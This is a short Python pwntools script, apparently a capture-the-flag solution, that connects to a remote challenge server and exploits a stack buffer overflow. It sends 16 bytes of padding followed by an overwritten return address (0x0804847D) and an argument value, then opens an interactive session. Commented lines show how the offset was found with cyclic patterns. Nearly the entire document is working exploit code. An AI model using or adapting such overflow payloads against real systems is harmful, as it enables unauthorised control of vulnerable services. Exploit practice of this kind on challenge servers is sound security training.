#! /usr/bin/env python
#pip install pwntools
from pwn import *
#r = remote('127.0.0.1', 8888)
r = remote('hack.bckdr.in', 8013)
raw_input('pause')
#r.send(cyclic(200)+'\n')
#print cyclic(200).find(p32(0x61616165))
#cyclic_find(p32(0x61616165))
#0804847D
#r.send('A'*16+p32(0xdeadbeef)+'\n')
r.send('A'*16+p32(0x0804847D)+'aaaa'+p32(0x2e4a)+'\n')
r.interactive()
